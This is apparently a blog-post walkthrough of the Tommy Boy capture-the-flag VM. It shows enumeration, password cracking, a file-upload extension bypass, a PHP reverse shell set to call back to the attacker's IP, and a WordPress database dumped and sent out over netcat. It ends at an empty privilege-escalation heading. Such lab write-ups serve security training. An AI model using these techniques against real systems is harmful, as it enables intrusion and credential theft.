@@ -1,0 +1,526 @@
+I"��<p>This box was created by <strong>Brian Johnson</strong>, The primary objective is to restore a backup copy of the homepage to Callahan Auto’s server. However, to consider the box fully pwned, you’ll need to collect 5 flags strewn about the system, and use the data inside them to unlock one final message.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<p>I started to discover the target machine, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
+Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
+WARNING: host part of 192.168.179.1/24 is non-zero
+Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.179.149 00:0c:29:8f:03:08       VMware, Inc.
+192.168.179.254 00:50:56:f5:4b:e2       VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>With unicornscan I performed a full TCP port scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.149:a <span class="nt">-R</span> 3 <span class="nt">-r</span> 3000
+...
+TCP open                     ssh[   22]         from 192.168.179.149  ttl 64
+TCP open                    http[   80]         from 192.168.179.149  ttl 64
+TCP open                http-alt[ 8008]         from 192.168.179.149  ttl 64
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>Then I did version detection and script scanning of the open TCP ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>nmap <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-p22</span>,80,8008 <span class="nt">-sV</span> <span class="nt">-sC</span> 192.168.179.149 <span class="nt">-oN</span> service-enum.txt
+...
+PORT     STATE SERVICE REASON         VERSION                                                                                                                      
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>                                                                   
+| ssh-hostkey:                                                                                                                                                     
+|   2048 a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 <span class="o">(</span>RSA<span class="o">)</span>                                                                                                     
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDi74A2GW2LYOIaOCt3+uBb2ecZSCL0EKylLIwMoKts0TvVdP82C/Ajp0FF2r2DjDw7QxvGtdkOiprtsyVmznzEfKnuuiBNpcBhj297sukKvVBKfDiTv51DvbeqKhQEDdZGlj2ZJWtit+EAxndPQEMs4Jr48mLjQhb/D6P78DEfKlGOlRBlaj3PVMVzNifEEhYF3pYDxbkQ4RFOILMiQGo7IOoMrxJBYYzDxwQ2dXyTElJ4++M/zGojF3wRDqLq2v35xyZWmsG+5mA93aAo7R9sFELQNzGhdHc33FapQPe/tcAO4AdCU8Ex4I20Na4T+pN73//wOwyNOO49d7pCrOP
+|   256 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBElpjsbihyk+MUGgJDx0lD/yU2pii+FxZ6jHwI6w/SyeYUDoLS50o98T0SRLJHEfAnVaR9eFAKoOI/LiBQ+UTWY<span class="o">=</span>
+|   256 56:9e:71:2a:a3:83:ff:63:11:7e:94:08:dd:28:1d:46 <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPN6HuPH7beQC1yRgoJaL+p2JhW62bu1xgCoKo4EPvFM
+80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+| http-robots.txt: 4 disallowed entries  
+| /6packsofb...soda /lukeiamyourfather 
+|_/lookalivelowbridge /flag-numero-uno.txt
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Welcome to Callahan Auto
+8008/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: KEEP OUT
+</code></pre></div></div>
+
+<h3 id="web-enumeration-on-port-80">Web Enumeration on port 80</h3>
+<p>I browsed the web server and found a welcome message of callahan auto.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-1.png" alt="" /></p>
+
+<p>Then I decided request for the robots file and found the first flag and other directories without any important, these were rabbit holes.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-2.png" alt="" /></p>
+
+<p><img src="/assets/images/tommyboy/screenshot-3.png" alt="" /></p>
+
+<p>I tried to view the source page with the browser, and was able to find in Nick’s specifications about the access to a web page, it said if you don’t remember it, you can access the following youtube url <a href="https://www.youtube.com/watch?v=VUxOd4CszJ8">https://www.youtube.com/watch?v=VUxOd4CszJ8</a>.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-4.png" alt="" /></p>
+
+<p>I browse the /prehistoricforest directory and it redirected me to a wordpress page, and I could see a question for Richard, finding out the password for the protected post, in the comment we see that we can find it accessing the /richard directory.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-5.png" alt="" /></p>
+
+<p><img src="/assets/images/tommyboy/screenshot-6.png" alt="" /></p>
+
+<p>In that directory I found an image, I downloaded it, used the strings command, and found an md5 hash.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-7.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>wget http://192.168.179.149/richard/shockedrichard.jpg
+
+root@kali:~/tommyboy<span class="nv">$ </span>strings shockedrichard.jpg | <span class="nb">head
+</span>JFIF
+Exif
+Google
+Copyright 
+ 1995 Paramount Pictures Corporation. Credit: 
+ 1995 Paramount Pictures / Courtesy: Pyxurz.
+0220
+ASCII
+ce154b5a8e59c89732bc25d6a2e6b90b
+8http://ns.adobe.com/xap/1.0/
+</code></pre></div></div>
+
+<p>I googled the password for this hash, and found the password <strong>spanky</strong>.
+<img src="/assets/images/tommyboy/screenshot-8.png" alt="" /></p>
+
+<p>I typed the password in the protected post and it enabled the hidden text.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-9.png" alt="" /></p>
+
+<p>In the comment we can see that Nick is some excited for his departure and leaves us some love words, anyway we see in text that there’s a backup called callahanbak.bak and we have to restore it, but first we need to login with Big Tom’s account via ssh, also mentions that this user always forgets his password, and about a FTP service that runs on a non-standard port and that it is online for 15 minutes and then down for the same time, to access to this service we can use the username <strong>nickburns</strong> and that the password is easy to guess.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-10.png" alt="" /></p>
+
+<p><img src="/assets/images/tommyboy/screenshot-11.png" alt="" /></p>
+
+<p>So I proceeded to perform a re-scan of the TCP ports and found the port 65534 is enabled, on which the FTP service is running.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.149:a <span class="nt">-R</span> 3 <span class="nt">-r</span> 3000
+...
+TCP open                     ssh[   22]         from 192.168.179.149  ttl 64 
+TCP open                    http[   80]         from 192.168.179.149  ttl 64 
+TCP open                http-alt[ 8008]         from 192.168.179.149  ttl 64 
+TCP open                 unknown[65534]         from 192.168.179.149  ttl 64
+
+root@kali:~/tommyboy<span class="nv">$ </span>nmap <span class="nt">-p65534</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> 192.168.179.149 
+...
+PORT      STATE SERVICE VERSION
+65534/tcp open  ftp     ProFTPD
+MAC Address: 00:0C:29:8F:03:08 <span class="o">(</span>VMware<span class="o">)</span>
+</code></pre></div></div>
+<p>Poked around in the comments I found the path to the second flag.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-12.png" alt="" /></p>
+
+<p><img src="/assets/images/tommyboy/screenshot-13.png" alt="" /></p>
+
+<h3 id="ftp-enumeration">FTP Enumeration</h3>
+<p>I tried log in with the user <strong>nickburns</strong> as username and password and had successful access, then downloaded the readme.txt file to the attacking machine, in the text file I can see that there is a subfolder called /NickIzL33t on this server somewhere.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>ftp 192.168.179.149 65534
+Connected to 192.168.179.149.
+220 Callahan_FTP_Server 1.3.5
+Name <span class="o">(</span>192.168.179.149:s4rgaz<span class="o">)</span>: nickburns
+331 Password required <span class="k">for </span>nickburns
+Password:
+230 User nickburns logged <span class="k">in
+</span>Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful
+150 Opening ASCII mode data connection <span class="k">for </span>file list
+drwxr-x---   4 nickburns nickburns     4096 Jul 20  2016 <span class="nb">.</span>
+drwxr-x---   4 nickburns nickburns     4096 Jul 20  2016 ..
+<span class="nt">-rw-r--r--</span>   1 root     root            0 Jul 21  2016 .bash_history
+drwx------   2 nickburns nickburns     4096 Jul  6  2016 .cache
+drwxrwxr-x   2 nickburns nickburns     4096 Jul  6  2016 .nano
+<span class="nt">-rw-rw-r--</span>   1 nickburns nickburns      977 Jul 15  2016 readme.txt
+226 Transfer <span class="nb">complete
+</span>ftp&gt; get readme.txt
+<span class="nb">local</span>: readme.txt remote: readme.txt
+200 PORT <span class="nb">command </span>successful
+150 Opening BINARY mode data connection <span class="k">for </span>readme.txt <span class="o">(</span>977 bytes<span class="o">)</span>
+226 Transfer <span class="nb">complete
+</span>977 bytes received <span class="k">in </span>0.04 secs <span class="o">(</span>25.4855 kB/s<span class="o">)</span>
+
+root@kali:~/tommyboy<span class="nv">$ </span><span class="nb">cat </span>readme.txt 
+To my replacement:
+
+If you<span class="s1">'re reading this, you have the unfortunate job of taking over IT responsibilities
+from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You'</span>ll be
+surrounded by stupid monkeys all day <span class="nb">who </span>can barely hit Ctrl+P and wouldn<span class="s1">'t know a fax machine
+from a flame thrower!
+
+Anyway I'</span>m not completely without mercy.  There<span class="s1">'s a subfolder called "NickIzL33t" on this server
+somewhere. I used it as my personal dropbox on the company'</span>s dime <span class="k">for </span>years.  Heh. LOL.
+I cleaned it out <span class="o">(</span>no naughty pix <span class="k">for </span>you!<span class="o">)</span> but <span class="k">if </span>you need a place to dump stuff that you want
+to look at on your phone later, consider that folder my gift to you.
+
+Oh by the way, Big Tom<span class="s1">'s a moron and always forgets his passwords and so I made an encrypted
+.zip of his passwords and put them in the "NickIzL33t" folder as well.  But guess what?
+He always forgets THAT password as well.  Luckily I'</span>m a <span class="nb">nice </span>guy and left him a hint sheet.
+
+Good luck, schmuck!
+
+LOL.
+
+<span class="nt">-Nick</span>
+</code></pre></div></div>
+
+<h3 id="web-enumeration-on-port-8008">Web Enumeration on port 8008</h3>
+<p>I requested the /NickIzL33t resource on port 8080, but it says that Nick and Steve Jobs can see this content.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-14.png" alt="" /></p>
+
+<p>After a long time without finding anything useful, I realize that Steve Job has access to this page so, we could access the content with some mac device, I installed the User-Agent Switcher plugin in the firefox browser and changed it for the iPhone user agent and shown the following content:</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-15.png" alt="" /></p>
+
+<p>I ran gobuster to find the file with .html extension but I didn’t find anything with the common word lists, so I fire gobuster again with the rockyou and finally find the file <strong>fallon1.html</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> rockyou.txt
+
+root@kali:~/tommyboy<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.149:8008/NickIzL33t/ <span class="nt">-a</span> <span class="s1">'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KH
+TML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)'</span> <span class="nt">-w</span> rockyou.txt <span class="nt">-e</span> <span class="nt">-x</span> html 2&gt;/dev/null
+...
+http://192.168.179.149:8008/NickIzL33t/fallon1.html         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 459]
+</code></pre></div></div>
+
+<p><img src="/assets/images/tommyboy/screenshot-16.png" alt="" /></p>
+
+<p>In the hint link I found the instructions to generate the password combinations for Big Tom, so I developed a bash script for this.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-17.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">file</span><span class="o">=</span><span class="s2">"tom_wordlist.txt"</span>
+<span class="nv">nick</span><span class="o">=</span><span class="s2">"bev"</span>
+<span class="nv">year</span><span class="o">=</span>1995
+
+<span class="nb">echo</span> <span class="s2">"Generating wordlist..."</span>
+
+<span class="k">for </span>ul <span class="k">in</span> <span class="o">{</span>A..Z<span class="o">}</span><span class="p">;</span> <span class="k">do
+    for </span>num <span class="k">in</span> <span class="o">{</span>00..99<span class="o">}</span><span class="p">;</span> <span class="k">do
+        for </span>l1 <span class="k">in</span> <span class="o">{</span>a..z<span class="o">}</span><span class="p">;</span> <span class="k">do
+            for </span>l2 <span class="k">in</span> <span class="o">{</span>a..z<span class="o">}</span><span class="p">;</span> <span class="k">do
+                for </span>s <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>symbols.txt<span class="si">)</span><span class="p">;</span> <span class="k">do
+                    </span><span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">nick</span><span class="k">}${</span><span class="nv">ul</span><span class="k">}${</span><span class="nv">num</span><span class="k">}${</span><span class="nv">l1</span><span class="k">}${</span><span class="nv">l2</span><span class="k">}${</span><span class="nv">s</span><span class="k">}${</span><span class="nv">year</span><span class="k">}</span><span class="s2">"</span>
+                <span class="k">done
+            done
+        done
+    done
+done</span> <span class="o">&gt;</span> <span class="nv">$file</span>
+</code></pre></div></div>
+
+<p>I created a symbols.txt file with some symbols and then ran the script.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>./pass-gen.sh
+</code></pre></div></div>
+
+<p>I clicked on “The Third flag” link and was redirected to the content of the flag.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-18.png" alt="" /></p>
+
+<p>Then with curl I downloaded the zip file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>wget <span class="nt">--user-agent</span><span class="o">=</span><span class="s2">"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)"</span> http://192.168.179.149:8008/NickIzL33t/t0msp4ssw0rdz.zip
+</code></pre></div></div>
+
+<p>With the wordlist generated before, I cracked the zip file, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>fcrackzip <span class="nt">-u</span> <span class="nt">-D</span> <span class="nt">-p</span> tom_wordlist.txt t0msp4ssw0rdz.zip
+
+PASSWORD FOUND!!!!: pw <span class="o">==</span> bevH00tr<span class="nv">$1995</span>
+</code></pre></div></div>
+
+<p>Then I unzip the <strong>t0msp4ssw0rdz.zip</strong> file, and I can see some credentials, for the bigtommysenior user the password is incomplete, there are numbers after this but it is written in a draft of the company blog, for the bigtom user the password hint is a famous Queen song.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>unzip t0msp4ssw0rdz.zip 
+Archive:  t0msp4ssw0rdz.zip
+<span class="o">[</span>t0msp4ssw0rdz.zip] passwords.txt password: 
+  inflating: passwords.txt           
+root@kali:~/tommyboy<span class="nv">$ </span><span class="nb">cat </span>passwords.txt 
+Sandusky Banking Site
+<span class="nt">------------------------</span>
+Username: BigTommyC
+Password: money
+
+TheKnot.com <span class="o">(</span>wedding site<span class="o">)</span>
+<span class="nt">---------------------------</span>
+Username: TomC
+Password: wedding
+
+Callahan Auto Server
+<span class="nt">----------------------------</span>
+Username: bigtommysenior
+Password: fatguyinalittlecoat
+
+Note: after the <span class="s2">"fatguyinalittlecoat"</span> part there are some numbers, but I don<span class="s1">'t remember what they are.
+However, I wrote myself a draft on the company blog with that information.
+
+Callahan Company Blog
+----------------------------
+Username: bigtom(I think?)
+Password: ??? 
+Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
+</span></code></pre></div></div>
+
+<p>I reviewed the html code with the browser and found a comment about a file upload resource in the /P4TCH_4D4M5 directory, as we can see this exists.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-19.png" alt="" /></p>
+
+<p><img src="/assets/images/tommyboy/screenshot-20.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="file-upload">File upload</h3>
+
+<p>I tried to upload a php file but this didn’t work, so I uploaded a php file with the extension .php.gif, this time was possible bypass the restrictions, and the php code was interpreted.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"&lt;?php phpinfo(); ?&gt;"</span> <span class="o">&gt;</span> info.php.gif
+</code></pre></div></div>
+<p><img src="/assets/images/tommyboy/screenshot-21.png" alt="" /></p>
+
+<p><img src="/assets/images/tommyboy/screenshot-22.png" alt="" /></p>
+
+<p><img src="/assets/images/tommyboy/screenshot-23.png" alt="" /></p>
+
+<p><strong>Getting a reverse shell</strong></p>
+
+<p>I used a reverse shell php from pentestmonkey, changed the ip address for the ours and the port, then I uploaded it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php z.php.gif
+root@kali:~/tommyboy<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.179.1/;s/1234/443/'</span> z.php.gif
+</code></pre></div></div>
+<p><img src="/assets/images/tommyboy/screenshot-24.png" alt="" /></p>
+
+<p><img src="/assets/images/tommyboy/screenshot-25.png" alt="" /></p>
+
+<p>I first set up a netcat listener and then we ran with the browser our reverse shell.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-26.png" alt="" /></p>
+
+<p>Finally I got a reverse shell, in the path /.5.txt found the flag number 5, but we need the fourth flag to complete the challenge and so we would join all flags and unzip the loot.zip file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443                                    
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.149] 49788
+Linux CallahanAutoSrv01 4.4.0-31-generic <span class="c">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 10:57:10 up 46 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ bash -i
+bash: cannot set terminal process group (1295): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@CallahanAutoSrv01:/$ ls -la
+ls -la
+total 105
+drwxr-xr-x  25 root     root      4096 Jul 15  2016 .
+drwxr-xr-x  25 root     root      4096 Jul 15  2016 ..
+-rwxr-x---   1 www-data www-data   520 Jul  7  2016 .5.txt
+drwxr-xr-x   2 root     root      4096 Jul  6  2016 bin
+drwxr-xr-x   4 root     root      1024 Jul 14  2016 boot
+...
+www-data@CallahanAutoSrv01:/$ cat .5.txt
+cat .5.txt
+FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+OH RICHARD DON'</span>T RUN AWAY FROM YOUR FEELINGS!!!!!!!!
+
+Flag data: Buttcrack
+
+Ok, so NOW what you <span class="k">do </span>is take the flag data from each flag and blob it into one big chunk.
+So <span class="k">for </span>example, <span class="k">if </span>flag 1 data was <span class="s2">"hi"</span> and flag 2 data was <span class="s2">"there"</span> and flag 3 data was <span class="s2">"you"</span>
+you would create this blob:
+
+hithereyou
+
+Do this <span class="k">for </span>ALL the flags sequentially, and this password will open the loot.zip <span class="k">in </span>Big Tom<span class="s1">'s folder and you can call the box PWNED.
+</span></code></pre></div></div>
+
+<p>Then I tried to search for the documentroot in the apache configuration files in the path <strong>/var/www/html/prehistoricforest/</strong> I found the wordpress credentials for mysql.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@CallahanAutoSrv01:/<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-ir</span> <span class="s1">'documentroot'</span> /etc/apache2/
+<span class="nb">grep</span> <span class="nt">-ir</span> <span class="s1">'documentroot'</span> /etc/apache2
+/etc/apache2/sites-available/default-ssl.conf:          DocumentRoot /var/www/html
+/etc/apache2/sites-available/000-default.conf:  DocumentRoot /var/www/html
+/etc/apache2/sites-available/2.conf:    DocumentRoot /var/thatsg0nnaleaveamark
+www-data@CallahanAutoSrv01:/<span class="nv">$ </span><span class="nb">cd</span> /var/www/html/prehistoricforest/
+<span class="nb">cd</span> /var/www/html/prehistoricforest/
+www-data@CallahanAutoSrv01:/var/www/html/prehistoricforest<span class="nv">$ </span><span class="nb">cat </span>wp-config.php
+...
+/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/             
+define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'wordpress'</span><span class="o">)</span><span class="p">;</span>                      
+                                                       
+/<span class="k">**</span> MySQL database username <span class="k">*</span>/                      
+define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'wordpressuser'</span><span class="o">)</span><span class="p">;</span>    
+                                  
+/<span class="k">**</span> MySQL database password <span class="k">*</span>/                       
+define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'CaptainLimpWrist!!!'</span><span class="o">)</span><span class="p">;</span>  
+                                              
+/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/            
+define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>      
+                                            
+/<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/   
+define<span class="o">(</span><span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8'</span><span class="o">)</span><span class="p">;</span>                                 
+                                                          
+/<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */ 
+define('</span>DB_COLLATE<span class="s1">', '');
+...
+</span></code></pre></div></div>
+
+<p>I dumped the wordpress database and transferred it to the attacking machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@CallahanAutoSrv01:/var/www/html/prehistoricforest<span class="nv">$ </span>mysqldump <span class="nt">-u</span> wordpressuser <span class="nt">-p</span> wordpress <span class="o">&gt;</span> /tmp/wpdump.sql
+&lt;orest<span class="nv">$ </span>mysqldump <span class="nt">-u</span> wordpressuser <span class="nt">-p</span> wordpress <span class="o">&gt;</span> /tmp/wpdump.sql            
+Enter password: CaptainLimpWrist!!!
+www-data@CallahanAutoSrv01:/var/www/html/prehistoricforest<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 6565 &lt; /tmp/wpdump.sql
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>nc 192.168.179.149 6565 <span class="o">&gt;</span> wpdump.sql
+</code></pre></div></div>
+
+<p>I filtered the password hashes to the file wphashes.txt, then I cracked these with hashcat and I got the password <strong>tomtom1</strong>, this belongs to tom user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span><span class="nb">grep</span> <span class="s1">'wp_users'</span> wpdump.sql | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\$P\$[^,]*'</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"'"</span> <span class="nt">-f</span> 1 <span class="o">&gt;</span> wphashes.txt
+root@kali:~/tommyboy<span class="nv">$ </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 400 wphashes.txt rockyou.txt
+...
+<span class="nv">$P$BmXAz</span>/a8CaPZDNTraFb/g6kZeTpijK.:tomtom1
+
+root@kali:~/tommyboy<span class="nv">$ </span><span class="nb">grep</span> <span class="s1">'$P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK.'</span> wpdump.sql
+</code></pre></div></div>
+
+<p>I logged in the wordpress page and had successful access.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-27.png" alt="" /></p>
+
+<p><img src="/assets/images/tommyboy/screenshot-28.png" alt="" /></p>
+
+<p>I clicked on the link under Drafts and it redirected me to the site where the final part of the password was located.</p>
+
+<p><img src="/assets/images/tommyboy/screenshot-29.png" alt="" /></p>
+
+<h3 id="access-via-ssh">Access via SSH</h3>
+<p>I logged in via SSH with the credentials:</p>
+
+<p><strong>username:</strong> bigtommysenior</p>
+
+<p><strong>password:</strong> fatguyinalittlecoat1938!!</p>
+
+<p>In the home directory we can see the fourth flag, the backup to restore and the loot.zip file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tommyboy<span class="nv">$ </span>ssh bigtommysenior@192.168.179.149
+bigtommysenior@192.168.179.149<span class="s1">'s password: 
+bigtommysenior@CallahanAutoSrv01:~$ id 
+uid=1002(bigtommysenior) gid=1002(bigtommysenior) groups=1002(bigtommysenior)
+bigtommysenior@CallahanAutoSrv01:~$ ls 
+callahanbak.bak  el-flag-numero-quatro.txt  LOOT.ZIP
+bigtommysenior@CallahanAutoSrv01:~$ cat el-flag-numero-quatro.txt 
+YAY!  Flag 4 out of 5!!!! And you should now be able to restore the Callhan Web server to normal
+working status.
+
+Flag data: EditButton
+
+But...but...where'</span>s flag 5?  
+
+I<span class="s1">'ll make it easy on you.  It'</span>s <span class="k">in </span>the root of this server at /5.txt
+</code></pre></div></div>
+
+<p>I restored the callahanbak.bak file on the server, we can check that’s all correct.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span><span class="nb">cp </span>callahanbak.bak /var/www/html/index.html
+</code></pre></div></div>
+<p><img src="/assets/images/tommyboy/screenshot-30.png" alt="" /></p>
+
+<p>To complete our objective I unzipped the LOOT.ZIP file with the following password that is the concatenation of the five flags.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flag1: B34rcl4ws
+Flag2: Z4l1nsky
+Flag3: TinyHead
+Flag4: EditButton
+Flag5: Buttcrack
+B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>unzip LOOT.ZIP 
+Archive:  LOOT.ZIP
+<span class="o">[</span>LOOT.ZIP] THE-END.txt password: 
+  inflating: THE-END.txt             
+bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span><span class="nb">cat </span>THE-END.txt 
+YOU CAME.
+YOU SAW.
+YOU PWNED.
+
+Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.
+
+GREAT WORK!
+
+I<span class="s1">'d love to know that you finished this VM, and/or get your suggestions on how to make the next 
+one better.
+
+Please shoot me a note at 7ms @ 7ms.us with subject line "Here comes the meat wagon!"
+
+Or, get in touch with me other ways:
+
+* Twitter: @7MinSec
+* IRC (Freenode): #vulnhub (username is braimee)
+
+Lastly, please don'</span>t forget to check out www.7ms.us and subscribe to the podcast at
+bit.ly/7minsec
+
+&lt;/shamelessplugs&gt;
+
+Thanks and have a blessed week!
+
+<span class="nt">-Brian</span> Johnson
+7 Minute Security
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
